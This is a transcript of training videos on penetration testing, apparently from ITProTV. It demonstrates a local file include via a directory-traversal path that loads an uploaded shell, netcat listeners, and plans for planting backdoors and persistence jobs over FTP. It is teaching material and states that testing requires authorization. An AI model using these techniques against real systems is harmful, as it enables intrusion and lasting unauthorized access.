and\n\n538\n00:28:24.980 --> 00:28:27.530\nwe have the exact place that it saved.\n\n539\n00:28:27.530 --> 00:28:32.330\nIt's going to be in\nthe web root/uploads/this\n\n540\n00:28:32.330 --> 00:28:34.460\ngif crazy name that it gives it.\n\n541\n00:28:34.460 --> 00:28:37.920\nSo let's try to Manipulate that dat so\nthat we can do that.\n\n542\n00:28:38.980 --> 00:28:41.930\nAll right lets before we do that\nyou know we gonna we have to make\n\n543\n00:28:41.930 --> 00:28:45.100\nsure we gonna file for a list because\nwere close to make it this happen.\n\n544\n00:28:45.100 --> 00:28:50.780\nLet me get a list a rockin bucken here so\nMC-MVLP9999 because\n\n545\n00:28:50.780 --> 00:28:56.860\nyou know I love it there\nlistening its waiting.\n\n546\n00:28:56.860 --> 00:28:58.110\nIt's all good gravy here.\n\n547\n00:28:59.220 --> 00:29:01.890\nAnd now we need to use our\ngood old friend tamperdata.\n\n548\n00:29:01.890 --> 00:29:03.570\nRemember tamperdata?\n\n549\n00:29:03.570 --> 00:29:07.320\nWe're following the same\ntype of procedure here.\n\n550\n00:29:07.320 --> 00:29:10.400\nSo let's go here, open tamperdata,\n\n551\n00:29:10.400 --> 00:29:16.760\ntools, tamperdata started\nup Start tempering.\n\n552\n00:29:16.760 --> 00:29:17.400\nThank you very much.\n\n553\n00:29:18.860 --> 00:29:22.800\nAnd what we want to do is we want\nto go to that index up here because\n\n554\n00:29:22.800 --> 00:29:23.700\nthat includes was.\n\n555\n00:29:23.700 --> 00:29:26.250\nSo I got to shrink this down.\n\n556\n00:29:26.250 --> 00:29:32.640\nI will go to, I will just this\nthis view source, click enter.\n\n557\n00:29:32.640 --> 00:29:36.030\nAnd yes we do want to tamper with this.\n\n558\n00:29:36.030 --> 00:29:40.810\nAnd look there, there's our cookie,\nPHP session id = yada, yada,\n\n559\n00:29:40.810 --> 00:29:42.840\nyada, but we're not gonna do that.\n\n560\n00:29:42.840 --> 00:29:45.960\nWe're gonna say,\nwe're going to take that out.\n\n561\n00:29:45.960 --> 00:29:50.840\nWe're going to say LAN =, cuz remember\nthat was that language parameter.\n\n562\n00:29:50.840 --> 00:29:53.000\nThat was looking for\nthat local file, right.\n\n563\n00:29:54.470 --> 00:29:57.625\nAnd then I'm just going to do some\ndirectory traversal, just to make sure.\n\n564\n00:29:57.625 --> 00:30:01.810\n../../../../../.\n\n565\n00:30:01.810 --> 00:30:05.630\nAnd I think if I remember,\nthis was an Apache server.\n\n566\n00:30:05.630 --> 00:30:10.350\nSo this should be And var www.html or\n\n567\n00:30:10.350 --> 00:30:14.530\n/html /uplink that's where it should be.\n\n568\n00:30:14.530 --> 00:30:16.475\nSo /var /www.\n\n569\n00:30:16.475 --> 00:30:20.920\n/html technically you don't\nhave to do this but I want you\n\n570\n00:30:20.920 --> 00:30:25.900\nguys to see if it makes it easier to\nunderstand to give you the entire.\n\n571\n00:30:25.900 --> 00:30:27.900\nA working directory\nthat we need to get to.\n\n572\n00:30:27.900 --> 00:30:30.990\nSo I'm traversing out of\nthe directory that I'm in and\n\n573\n00:30:30.990 --> 00:30:35.770\nthen back down into var.www.html/upload\nand then slash whatever that image was.\n\n574\n00:30:35.770 --> 00:30:41.930\nActually I copied that, so\nI'll just copy and paste it.\n\n575\n00:30:46.790 --> 00:30:47.340\nHere we go.\n\n576\n00:30:47.340 --> 00:30:49.030\nMake sure that everything is good.\n\n577\n00:30:49.030 --> 00:30:52.150\nNo extra double slashes or anything.\n\n578\n00:30:52.150 --> 00:30:56.957\nEverything is looking great Now we\n\n579\n00:30:56.957 --> 00:31:01.710\nclick OK and\nwe shall see if our local file, or\n\n580\n00:31:01.710 --> 00:31:06.560\nlook at that there my good\nfriends is shell And no show.\n\n581\n00:31:06.560 --> 00:31:08.560\nJust welcome to the show everyone.\n\n582\n00:31:08.560 --> 00:31:09.060\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n583\n00:31:09.060 --> 00:31:10.660\n&gt;&gt; It's a wonderful thing.\n\n584\n00:31:10.660 --> 00:31:11.970\nDo a Who am I.\n\n585\n00:31:11.970 --> 00:31:12.920\nNot there.\n\n586\n00:31:12.920 --> 00:31:13.790\nDown here Larry.\n\n587\n00:31:13.790 --> 00:31:15.350\nWho am I.\nAnd again,\n\n588\n00:31:15.350 --> 00:31:19.740\nI am running as the web server\nservice account, but from here again,\n\n589\n00:31:19.740 --> 00:31:22.850\nwe can go with privilege escalation and\nmove on from there.\n\n590\n00:31:22.850 --> 00:31:27.610\nWe do have Remote access, and\nnow we're well on our way to root access.\n\n591\n00:31:27.610 --> 00:31:28.720\n&gt;&gt; Fantastic Daniel.\n\n592\n00:31:28.720 --> 00:31:29.880\nThat was really exciting,\n\n593\n00:31:29.880 --> 00:31:33.210\ngreat look at a couple of different\nthings we really accomplished there.\n\n594\n00:31:33.210 --> 00:31:36.430\nWe were able to do\nthe local file include and\n\n595\n00:31:36.430 --> 00:31:39.730\ngrab that and\nget our Shell access to that web server,\n\n596\n00:31:39.730 --> 00:31:41.990\nas well as get into their database-\n&gt;&gt; [LAUGH]\n\n597\n00:31:41.990 --> 00:31:42.800\n&gt;&gt; On the side, and\n\n598\n00:31:42.800 --> 00:31:45.600\nyou can't beat that, right?\n\n599\n00:31:45.600 --> 00:31:47.520\nThat's a two-fer, so we love it.\n\n600\n00:31:47.520 --> 00:31:50.570\nAll right, Danny, we thank you for\nthose demonstrations there, fantastic.\n\n601\n00:31:50.570 --> 00:31:53.580\nWe hope everybody out there\nenjoyed watching this one.\n\n602\n00:31:53.580 --> 00:31:56.540\nSigning off for ITProTV,\nI've

ITProTV.\n\n3\n00:00:12.326 --> 00:00:14.684\n&gt;&gt; Hello.\nWelcome to another exciting episode here\n\n4\n00:00:14.684 --> 00:00:15.281\nat ITProTV.\n\n5\n00:00:15.281 --> 00:00:19.407\nI'm your host Mike Roderick and\ntoday we're doing penetration testing.\n\n6\n00:00:19.407 --> 00:00:24.354\nAnd in this episode we're gonna be\nlooking at File transfer fun, sounds fun.\n\n7\n00:00:24.354 --> 00:00:26.080\n&gt;&gt; [LAUGH]\n&gt;&gt; Let's see what Daniel has in\n\n8\n00:00:26.080 --> 00:00:26.710\nstore for us.\n\n9\n00:00:26.710 --> 00:00:27.750\nWelcome back Daniel.\n\n10\n00:00:27.750 --> 00:00:28.830\n&gt;&gt; So glad to be back, Mike.\n\n11\n00:00:28.830 --> 00:00:32.500\nYes, I know it's an odd title,\ncuz I'm an odd person so I like to\n\n12\n00:00:32.500 --> 00:00:36.320\nhave a little fun when I'm doing things\nand today is all about file transfer fun.\n\n13\n00:00:36.320 --> 00:00:40.420\nAnd it probably does seem a little bit\nambiguous as far as the title goes.\n\n14\n00:00:40.420 --> 00:00:44.790\nProbably not gleaning too much\nout of that as content, per se.\n\n15\n00:00:44.790 --> 00:00:47.860\nSo let me remove the veil so\nthat thought might see.\n\n16\n00:00:47.860 --> 00:00:48.450\n&gt;&gt; Drumroll.\n\n17\n00:00:48.450 --> 00:00:49.320\n&gt;&gt; Yeah, drumroll please.\n\n18\n00:00:49.320 --> 00:00:53.260\nWhat we're talking about here\nis being able to transfer files,\n\n19\n00:00:53.260 --> 00:00:54.295\nyou probably picked that up.\n\n20\n00:00:54.295 --> 00:00:55.040\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n21\n00:00:55.040 --> 00:00:59.100\nthe problem comes in is when you exploit\na machine, a lot of times you're working\n\n22\n00:00:59.100 --> 00:01:03.810\nwith that reverse shell or\na bind shell or something like that.\n\n23\n00:01:03.810 --> 00:01:08.550\nAnd since it's probably done\nsomething to trigger that to occur,\n\n24\n00:01:08.550 --> 00:01:10.550\nyou've exploited a buffer overflow.\n\n25\n00:01:10.550 --> 00:01:14.280\nOr there was a remote code\nexploitation you've found online and\n\n26\n00:01:14.280 --> 00:01:18.230\nyou compiled it and ran it against\nthat machine and it did these things.\n\n27\n00:01:18.230 --> 00:01:20.218\nWhatever it was, you get that shell back.\n\n28\n00:01:20.218 --> 00:01:26.805\nIt doesn't do really well\nwith like interactive things.\n\n29\n00:01:26.805 --> 00:01:30.670\nBut you will want to have file,\nyou will want to transfer files to it.\n\n30\n00:01:30.670 --> 00:01:32.550\nAnd we'll talk about that just for\na second.\n\n31\n00:01:32.550 --> 00:01:34.070\nSo that's what today is all about really.\n\n32\n00:01:34.070 --> 00:01:37.297\nActually, I guess we're gonna\ntalk about it now [LAUGH].\n\n33\n00:01:37.297 --> 00:01:40.352\n&gt;&gt; It could be a case where maybe that\nmachine you've compromised is your\n\n34\n00:01:40.352 --> 00:01:41.440\npivot point.\n\n35\n00:01:41.440 --> 00:01:44.735\nAnd from there, now that you're inside\nthat network, you'd like to do some\n\n36\n00:01:44.735 --> 00:01:47.750\ndeeper scans of stuff you couldn't\nget to when you were on the outside.\n\n37\n00:01:47.750 --> 00:01:50.620\nDoes that machine have a scanner on it?\n\n38\n00:01:50.620 --> 00:01:52.240\nDoes it have the tools you need?\n\n39\n00:01:52.240 --> 00:01:54.210\nSo when we say transferring files,\n\n40\n00:01:54.210 --> 00:01:57.410\nthey very well could be\nexecutables programs as well.\n\n41\n00:01:57.410 --> 00:01:59.590\n&gt;&gt; Yeah and Mike is actually right here.\n\n42\n00:01:59.590 --> 00:02:03.775\nWhen I say files I should have clarified\nI don't mean, here's my grocery list.\n\n43\n00:02:03.775 --> 00:02:05.380\n&gt;&gt; [LAUGH]\n&gt;&gt; Here's an Excel spreadsheet.\n\n44\n00:02:05.380 --> 00:02:07.840\n&gt;&gt; Or we could be exfiltrating data or\nsomething.\n\n45\n00:02:07.840 --> 00:02:09.710\n&gt;&gt; Yeah, you could be doing that.\n\n46\n00:02:09.710 --> 00:02:13.340\nBut, typically what I mean is that\nwe need to be able to transfer\n\n47\n00:02:13.340 --> 00:02:15.880\nthings that are gonna allow\nus to maintain access.\n\n48\n00:02:15.880 --> 00:02:18.840\nThey're going to allow us to use it\nlike Mike said as a pivot point for\n\n49\n00:02:18.840 --> 00:02:21.660\nfurther exploitation maybe\nit's a multi home machine.\n\n50\n00:02:21.660 --> 00:02:26.250\nAnd now I want to continue scanning\nmachines I didn't have access to before,\n\n51\n00:02:26.250 --> 00:02:29.200\nbut now that I've gained access\nto this machine, I can see them.\n\n52\n00:02:29.200 --> 00:02:33.930\nBut does it have Nmap installed,\nprobably not, maybe not, who knows?\n\n53\n00:02:33.930 --> 00:02:35.410\nRight?\nThat's the whole purpose.\n\n54\n00:02:35.410 --> 00:02:38.740\nIs it of machine you've exploited\ndoesn't have these things,\n\n55\n00:02:38.740 --> 00:02:44.260\nhow do we get our tools and\nthings that we would normally use?\n\n56\n00:02:44.260 --> 00:02:49.010\nAs a pen tester or a hacker to continue\nand further down the rabbit hole.\n\n57\n00:02:49.010 --> 00:02:51.560\nHow do we get that from our\nmachine into their machine?\n\n58\n00:02:51.560 --> 00:02:52.950\nSo that's what today is about.\n\n59\n00:02:52.950 --> 00:02:54.260\nA couple of ways in which we can do that.\n\n60\n00:02:54.260 --> 00:02:57.980\nThere's actually like a bunch of different\nways that this could possibly be done.\n\n61\n00:02:57.980 --> 00:03:02.760\nI'm gonna show you some manual\nways just in case you just get\n\n62\n00:03:02.760 --> 00:03:05.769\nthe turd of the ball that\nhas nothing on there.\n\n63\n00:03:05.769 --> 00:03:06.730\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n64\n00:03:06.730 --> 00:03:10.560\nmaybe some basic file transfer protocols.\n\n65\n00:03:10.560 --> 00:03:12.050\nAnd that's what we're gonna use.\n\n66\n00:03:12.050 --> 00:03:12.830\nWe're gonna use FTP.\n\n67\n00:03:12.830 --> 00:03:17.580\nBecause typically FTP is found\non just about everything.\n\n68\n00:03:17.580 --> 00:03:19.380\nSo we'll show you how to do that.\n\n69\n00:03:19.380 --> 00:03:22.340\nWell also I want you guess in it\nbefore we continue on further.\n\n70\n00:03:23.670 --> 00:03:27.510\nAnother reason that we might wanna\nwatch this I said maintaining access.\n\n71\n00:03:27.510 --> 00:03:29.530\nYou may wanna upload\nthe back door to this thing.\n\n72\n00:03:29.530 --> 00:03:32.830\nMaybe a nice file so you don't have\nto keep reinventing the wheel.\n\n73\n00:03:32.830 --> 00:03:37.275\nYou've created the batch file or something\nif the windows machine or Cron job,\n\n74\n00:03:37.275 --> 00:03:41.540\nif it's a Linux machine that automatically\nchecks to see if a user is there.\n\n75\n00:03:41.540 --> 00:03:45.050\nAnd if not,\ncreate that user put said password and\n\n76\n00:03:45.050 --> 00:03:49.830\nstart a netcat listener at 12:00 every\nnight if that's not already happening.\n\n77\n00:03:49.830 --> 00:03:53.890\nThings of that nature that I have to\nkeep access, because what happens?\n\n78\n00:03:53.890 --> 00:03:57.352\nYou think well I can use my exploit and\nget in this box whenever I want.\n\n79\n00:03:57.352 --> 00:03:59.600\nWell, maybe.\n\n80\n00:03:59.600 --> 00:04:00.180\nWhat happens?\n\n81\n00:04:00.180 --> 00:04:02.790\nMike, you've worked in\nsystems administration,\n\n82\n00:04:02.790 --> 00:04:04.580\nI've worked in systems administration.\n\n83\n00:04:04.580 --> 00:04:08.640\nI don't know about you, but I get little\nemails from time to time who say, hey,\n\n84\n00:04:08.640 --> 00:04:09.560\nthere's an update ready.\n\n85\n00:04:09.560 --> 00:04:12.540\n&gt;&gt; Yeah, there's something going on here,\nor there's an update.\n\n86\n00:04:12.540 --> 00:04:15.440\nAnd maybe the reason you're able to\ncompromise that machine because as\n\n87\n00:04:15.440 --> 00:04:18.160\nan admin I was a little slow\nin doing those updates.\n\n88\n00:04:18.160 --> 00:04:21.510\nSo you come back a few days later\nexpecting that exploit that worked\n\n89\n00:04:21.510 --> 00:04:24.520\nbeautifully, you spent all that time\ndoing to get you right back in and\n\n90\n00:04:24.520 --> 00:04:26.130\nall of a sudden it doesn't work.\n\n91\n00:04:26.130 --> 00:04:27.240\nAnd now you're banging your head\n\n92\n00:04:27.240 --> 00:04:29.060\nwishing you would have had\nthat back door in place.\n\n93\n00:04:29.060 --> 00:04:30.020\n&gt;&gt; That's exactly right.\n\n94\n00:04:30.020 --> 00:04:34.050\nSo systems get patched,\nthey get updated and exploits go away.\n\n95\n00:04:34.050 --> 00:04:37.810\nSo the exploit that got you in yesterday\nis not necessarily gonna get you in\n\n96\n00:04:37.810 --> 00:04:41.680\ntomorrow, because that river changes,\nso be prepared for that.\n\n97\n00:04:41.680 --> 00:04:44.140\nWe have to keep that in mind.\n\n98\n00:04:44.140 --> 00:04:48.540\nWe want to be able to maintain our access\neven if the system does get patched.\n\n99\n00:04:48.540 --> 00:04:53.500\nSo that's basically why we want to be\nable to transfer our files and tools and\n\n100\n00:04:53.500 --> 00:04:57.060\nthings, upload them to\nour exploited systems.\n\n101\n00:04:57.060 --> 00:05:00.310\nNow let's talk about Linux really quickly.\n\n102\n00:05:00.310 --> 00:05:04.080\nLinux, the Linux system god bless them.\n\n103\n00:05:04.080 --> 00:05:05.710\nThey give you just about\neverything under the sun.\n\n104\n00:05:05.710 --> 00:05:10.670\nLinux love to have tools available for\nyou for doing things from a command line.\n\n105\n00:05:10.670 --> 00:05:13.180\n&gt;&gt; What does a hacker do\nif he breaks into a box and\n\n106\n00:05:13.180 --> 00:05:15.352\nthe box is running on Kali Linux.\n\n107\n00:05:15.352 --> 00:05:17.480\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH]\n\n108\n00:05:17.480 --> 00:05:18.447\n&gt;&gt; I bet they laugh.\n\n109\n00:05:18.447 --> 00:05:19.750\n&gt;&gt; [LAUGH]\n&gt;&gt; If I were me and\n\n110\n00:05:19.750 --> 00:05:21.840\nif I broke into a box and\nit was a Kali Linux machine.\n\n111\n00:05:21.840 --> 00:05:24.048\n&gt;&gt; Right.\n&gt;&gt; I'd be like, wow.\n\n112\n00:05:24.048 --> 00:05:26.649\n&gt;&gt; Thank you for setting up my\nattack machines for me, I guess.\n\n113\n00:05:26.649 --> 00:05:27.536\nI don't know.\n&gt;&gt; Yeah, just fine.\n\n114\n00:05:27.536 --> 00:05:28.483\nYou're going to jail.\n\n115\n00:05:28.483 --> 00:05:30.440\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n116\n00:05:30.440 --> 00:05:31.180\n&gt;&gt; Cuz it ain't gonna me\n\n117\n00:05:31.180 --> 00:05:33.490\nbe they come looking for,\nit's gonna be you.\n\n118\n00:05:33.490 --> 00:05:34.360\nNo, we don't do that.\n\n119\n00:05:34.360 --> 00:05:38.165\nRemember, this is our time of day where we\ntell everyone we do not break into other\n\n120\n00:05:38.165 --> 00:05:41.220\npeople's' machines just because\nit's fun or profitable.\n\n121\n00:05:41.220 --> 00:05:44.800\nWe break into other people's machines\nbecause they've given us authorized access\n\n122\n00:05:44.800 --> 00:05:49.600\nto do so for the purposes of penetration\ntesting, or they are our machines.\n\n123\n00:05:49.600 --> 00:05:51.490\nWe own them,\nwe can do whatever we feel like to them.\n\n124\n00:05:51.490 --> 00:05:55.860\nIf you just want to delete the C drive or\nwhatever, because it's yours\n\n125\n00:05:55.860 --> 00:06:00.410\ngo right ahead feel free and blast\nthose things with every nuke you have.\n\n126\n00:06:00.410 --> 00:06:01.452\n&gt;&gt; Absolutely.\n\n127\n00:06:01.452 --> 00:06:02.120\nAll right so Daniel,\n\n128\n00:06:02.120 --> 00:06:06.360\nwhat kind of things are we looking at if\nwe want to get these files to our target?\n\n129\n00:06:06.360 --> 00:06:08.190\nAre there any specific things\nwe could use to do that?\n\n130\n00:06:08.190 --> 00:06:09.840\nI know you mentioned FTP.\n\n131\n00:06:09.840 --> 00:06:11.680\n&gt;&gt; Yeah, FTP is a great thing because FTP,\n\n132\n00:06:11.680 --> 00:06:15.300\nlike I said is typically already\ninstalled on the machine.\n\n133\n00:06:15.300 --> 00:06:16.480\nAlmost every,\n\n134\n00:06:16.480 --> 00:06:21.750\nI don't know of an OS that does not\ncome preinstalled with an FTP client.\n\n135\n00:06:21.750 --> 00:06:22.767\nSo FTP is a great thing.\n\n136\n00:06:22.767 --> 00:06:25.454\nYou can almost guarantee.\n\n137\n00:06:25.454 --> 00:06:27.350\nRely that it will be there.\n\n138\n00:06:27.350 --> 00:06:31.670\nSo being able to use\nFTP is gonna be great.\n\n139\n00:06:31.670 --> 00:06:33.020\nAnother one is TFTP.\n\n140\n00:06:33.020 --> 00:06:36.150\nTFTP is great, it's quick, it's easy.\n\n141\n00:06:36.150 --> 00:06:39.920\nThe problem is, is that it's really hit or\nmiss whether or\n\n142\n00:06:39.920 --> 00:06:42.500\nnot it will be available for you.\n\n143\n00:06:42.500 --> 00:06:46.260\nI'll try to show the TFTP I didn't really\nset up a demo we'll just wing it and\n\n144\n00:06:46.260 --> 00:06:47.350\nsee if it works.\n\n145\n00:06:47.350 --> 00:06:49.750\nBut we're going to start\ndefinitely with FTP cuz FTP,\n\n146\n00:06:49.750 --> 00:06:52.960\nI want you to be able\nto know how to do this.\n\n147\n00:06:52.960 --> 00:06:55.810\nSo if we're talking\nabout a Window's system,\n\n148\n00:06:55.810 --> 00:06:58.530\nlet's just get some\nparticulars out of the way.\n\n149\n00:06:58.530 --> 00:07:01.270\nUsually already on XP, Windows 2003, so\n\n150\n00:07:01.270 --> 00:07:05.580\nif you're working with some older type\nof machines is probably already there.\n\n151\n00:07:05.580 --> 00:07:09.480\nIf you're talking Windows 7,\n2008 server, up and above.\n\n152\n00:07:09.480 --> 00:07:12.140\nIt might not be there,\nyou might have to install it.\n\n153\n00:07:12.140 --> 00:07:14.680\n&gt;&gt; That's the TFTP trivial\nfile transfer protocol.\n\n154\n00:07:14.680 --> 00:07:16.340\n&gt;&gt; Right, right.\n\n155\n00:07:16.340 --> 00:07:17.200\nEven FTP.\n\n156\n00:07:17.200 --> 00:07:18.300\n&gt;&gt; Okay.\n&gt;&gt; Even FTP.\n\n157\n00:07:18.300 --> 00:07:22.610\nSo they started like, it's there which you\nhave to kinda like enable it kinda thing.\n\n158\n00:07:22.610 --> 00:07:23.390\nSo.\n\n159\n00:07:23.390 --> 00:07:28.250\nYeah there you go whereas\nTFTP not installed on newer\n\n160\n00:07:28.250 --> 00:07:31.180\nWindows machines at least if\nI'm remembering correctly.\n\n161\n00:07:31.180 --> 00:07:32.570\n&gt;&gt; And what about Linux?\n\n162\n00:07:32.570 --> 00:07:34.170\n&gt;&gt; Linux always almost guaranteed.\n\n163\n00:07:34.170 --> 00:07:36.240\nIt's FTP client is there.\n\n164\n00:07:37.780 --> 00:07:40.140\nEven netcat a lot of times\ncomes pre-installed.\n\n165\n00:07:40.140 --> 00:07:46.505\nWget which is an internet or\na network get trials work.\n\n166\n00:07:46.505 --> 00:07:50.905\nWe were basically saying give me web pages\nor if there's file to download I can use\n\n167\n00:07:50.905 --> 00:07:54.810\nWget to download them from a web source or\na network source.\n\n168\n00:07:54.810 --> 00:07:58.823\nThere's also curl which will\ndo the same thing basically.\n\n169\n00:07:58.823 --> 00:08:01.300\nAnd they're usually installed\non your Linux system.\n\n170\n00:08:01.300 --> 00:08:05.650\nSo Linux is It's usually not that\ndifficult to use as a pivot point,\n\n171\n00:08:05.650 --> 00:08:09.120\nbecause it has a lot of stuff prebuilt,\nprebaked in.\n\n172\n00:08:09.120 --> 00:08:14.210\nWhere as Windows,\nyou're probably gonna be left with FTP.\n\n173\n00:08:14.210 --> 00:08:17.380\nSo that's where we're gonna\nspend some time today.\n\n174\n00:08:17.380 --> 00:08:20.930\nI did mention interactive versus non\ninteractive, let me just reiterate that.\n\n175\n00:08:22.150 --> 00:08:25.616\nSo, the FTP client is\nan interactive client.\n\n176\n00:08:25.616 --> 00:08:29.480\nIf you type in FTP and you hit Enter,\nit drops you to an FTP prompt.\n\n177\n00:08:29.480 --> 00:08:34.230\nWhere you can type an FTP commands like\nOpen and Get and Bend and all the other\n\n178\n00:08:34.230 --> 00:08:38.010\nthings that are available for\nyou to be able to log in to FTP servers.\n\n179\n00:08:38.010 --> 00:08:41.520\nAnd once you log in, you have another set\nof commands for transferring files and\n\n180\n00:08:41.520 --> 00:08:45.340\nputting files and\nworking with the directory search.\n\n181\n00:08:45.340 --> 00:08:46.040\nAll that good in nature.\n\n182\n00:08:46.040 --> 00:08:48.570\nBut that's an interactive system.\n\n183\n00:08:48.570 --> 00:08:53.060\nIt drops you out of\nthe shell into an FTP shell.\n\n184\n00:08:53.060 --> 00:08:58.308\nAnd again, because we are logged\nin a variously to put in bluntly,\n\n185\n00:08:58.308 --> 00:09:02.642\nthat tends to give I think\nthe technical word is hinky.\n\n186\n00:09:02.642 --> 00:09:03.940\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n187\n00:09:03.940 --> 00:09:05.380\n&gt;&gt; It doesn't work well.\n\n188\n00:09:05.380 --> 00:09:09.810\nIt goes haywire,\nyou don't see the output you wanna see.\n\n189\n00:09:09.810 --> 00:09:11.420\nMaybe the commands are being inputted.\n\n190\n00:09:11.420 --> 00:09:12.780\nYou don't know, things get weird.\n\n191\n00:09:12.780 --> 00:09:14.610\nAnd it's just really\ndifficult to work with.\n\n192\n00:09:14.610 --> 00:09:18.106\n&gt;&gt; Yeah, we saw that the other day I think\nin one of those episodes where you had\n\n193\n00:09:18.106 --> 00:09:19.450\ngotten your reverse shell.\n\n194\n00:09:19.450 --> 00:09:22.565\nI think did an outlet where\nwe see nothing in the prompt,\n\n195\n00:09:22.565 --> 00:09:25.826\nhit Enter a couple times and\nboom, there was everything.\n\n196\n00:09:25.826 --> 00:09:29.018\nIt was just again, having trouble\nsending it back to the console because\n\n197\n00:09:29.018 --> 00:09:31.730\nthe console's not where it should be,\nit's remote yeah.\n\n198\n00:09:31.730 --> 00:09:32.240\n&gt;&gt; Right.\nYeah.\n\n199\n00:09:32.240 --> 00:09:33.799\nRight, yeah.\nSo we wanna avoid that,\n\n200\n00:09:33.799 --> 00:09:35.527\nwe just wanna make our lives easy.\n\n201\n00:09:35.527 --> 00:09:39.421\nAnd the way we can do this by just\nwriting a script that will do it for us.\n\n202\n00:09:39.421 --> 00:09:43.885\nAnd the cool thing about FTP is\nthat on the Windows machine,\n\n203\n00:09:43.885 --> 00:09:46.753\nfunny enough, not the Linux client.\n\n204\n00:09:46.753 --> 00:09:50.800\nAt least not the FTP client on my Linux\nsystem, it does not support this feature.\n\n205\n00:09:50.800 --> 00:09:53.870\nWe have to actually write a bash script,\nwhich we'll do.\n\n206\n00:09:53.870 --> 00:09:58.510\nBut in Windows, the FTP client there\nsupports reading input from a file.\n\n207\n00:09:59.540 --> 00:10:03.900\nSo this helps us out because of\nthat whole interactive process,\n\n208\n00:10:03.900 --> 00:10:05.800\nnow I can run on this non interactive.\n\n209\n00:10:05.800 --> 00:10:10.690\nJust feed it a line which reads from\na file with a bunch of commands.\n\n210\n00:10:10.690 --> 00:10:14.690\nAnd then everything's done, I don't\nhave to interactively work with it.\n\n211\n00:10:14.690 --> 00:10:16.440\nIt just says, here's my instructions set.\n\n212\n00:10:16.440 --> 00:10:18.620\nLet me do that when I'm done, exit out.\n\n213\n00:10:18.620 --> 00:10:20.710\nAnd I'm done you're not\nworking interactively with it.\n\n214\n00:10:20.710 --> 00:10:22.800\nSo therefore you don't\nhave to worry about it.\n\n215\n00:10:22.800 --> 00:10:27.640\nMessing around with your weird\nshell that you've spawned out.\n\n216\n00:10:27.640 --> 00:10:30.850\nSo what do we need for the pre-set up?\n\n217\n00:10:30.850 --> 00:10:35.090\nWe need to install and\nstart a local FTP server on the attacker\n\n218\n00:10:35.090 --> 00:10:37.765\nPC because I'm gonna be\nuploading files via FTP.\n\n219\n00:10:37.765 --> 00:10:41.130\nSo a good idea for\nyou to be running an FTP server.\n\n220\n00:10:41.130 --> 00:10:45.900\nI'm running VSFTP on my machine,\nthere are others as well.\n\n221\n00:10:45.900 --> 00:10:46.720\nWhatever you like.\n\n222\n00:10:46.720 --> 00:10:48.090\nIf it works for you, that's great.\n\n223\n00:10:48.090 --> 00:10:50.120\nGo go out and\ngrab your favorite FTP server.\n\n224\n00:10:50.120 --> 00:10:54.660\nIf it's already installed fire it up\nget your files put them in the FTP\n\n225\n00:10:54.660 --> 00:10:55.530\nroot directory so\n\n226\n00:10:55.530 --> 00:10:59.020\nthat when someone logs into FTP those\nare the files that will be available.\n\n227\n00:10:59.020 --> 00:11:01.910\nYou'll probably want\nto create an FTP user.\n\n228\n00:11:01.910 --> 00:11:05.310\nYou don't want just typically\nanonymous FTP login is\n\n229\n00:11:05.310 --> 00:11:07.950\nnot the most secure thing on Earth.\n\n230\n00:11:07.950 --> 00:11:12.300\nSo just create a user for that account so\nthat you can use that for these purposes.\n\n231\n00:11:13.420 --> 00:11:14.486\nAnd then copy.\n\n232\n00:11:14.486 --> 00:11:16.737\nYour exploitation tools,\nyour back doors, your cron jobs,\n\n233\n00:11:16.737 --> 00:11:17.963\nwhatever it is you've created.\n\n234\n00:11:17.963 --> 00:11:23.525\nAnd slam it into that directory so\nthat that user can download those tools.\n\n235\n00:11:23.525 --> 00:11:28.480\nSo that is our basic setup for\nattacking machine.\n\n236\n00:11:28.480 --> 00:11:35.052\nThen all we have to do is log in through\nan exploit to an exploit machine.\n\n237\n00:11:35.052 --> 00:11:37.542\nFor this testing purposes, for\nthe demonstration purposes,\n\n238\n00:11:37.542 --> 00:11:40.792\nI'm just going to use our buffer\nexploit on our Windows machine.\n\n239\n00:11:40.792 --> 00:11:43.490\nBecause it's the only machine\nI have access to that we can\n\n240\n00:11:43.490 --> 00:11:45.830\nactually play with and\ndestroy if necessary.\n\n241\n00:11:45.830 --> 00:11:47.010\nSo that's what I'm gonna do.\n\n242\n00:11:47.010 --> 00:11:50.240\nI think I already have that fired up.\n\n243\n00:11:50.240 --> 00:11:53.840\nYeah, there's the vuln server listener.\n\n244\n00:11:53.840 --> 00:11:57.350\nJust awaiting for connections there.\n\n245\n00:11:57.350 --> 00:12:01.467\nSo I will,\nI guess I'll fire up the listener here.\n\n246\n00:12:01.467 --> 00:12:05.366\nN seed,\nnvlp I don't even remember my commands\n\n247\n00:12:05.366 --> 00:12:08.489\nI'm blanking out there for a second.\n\n248\n00:12:08.489 --> 00:12:10.703\n&gt;&gt; [LAUGH].\n&gt;&gt; 5555 let's fire that up and\n\n249\n00:12:10.703 --> 00:12:13.690\nthen I'll come over here and\nfire off our exploit.\n\n250\n00:12:13.690 --> 00:12:16.116\nGood old sploit.\n\n251\n00:12:16.116 --> 00:12:19.028\n.py, there we go.\n\n252\n00:12:19.028 --> 00:12:22.550\nAnd you can see my prompt has come back.\n\n253\n00:12:22.550 --> 00:12:23.610\nI'm logged in.\n\n254\n00:12:23.610 --> 00:12:26.350\nI've already created\na nefarious user on this and\n\n255\n00:12:26.350 --> 00:12:29.070\nthen added him to\nthe local administrators.\n\n256\n00:12:29.070 --> 00:12:30.590\nBut again, that might go away, right?\n\n257\n00:12:30.590 --> 00:12:32.010\nSomebody might, what is this?\n\n258\n00:12:32.010 --> 00:12:33.170\nWe've been hacked!\n\n259\n00:12:33.170 --> 00:12:35.300\nAnd then, we need to patch our systems,\nda, da, da.\n\n260\n00:12:35.300 --> 00:12:38.500\nThe whole nine and take measures, so\n\n261\n00:12:38.500 --> 00:12:43.730\nI can't count on this remaining there\nwith any kind of level of confidence.\n\n262\n00:12:43.730 --> 00:12:44.362\nSo that's what we're gonna do.\n\n263\n00:12:44.362 --> 00:12:45.247\nAnd all I'm gonna do,\n\n264\n00:12:45.247 --> 00:12:48.330\njust for demonstration purposes yet\nagain, my backdoor's gonna be netcat.\n\n265\n00:12:48.330 --> 00:12:52.800\nCuz typically netcat not found\non a Windows installation.\n\n266\n00:12:52.800 --> 00:12:57.830\nSo then if I do a dir, you can see I'm\nin this directory, netcat's not there.\n\n267\n00:12:57.830 --> 00:13:01.802\nNetcat is 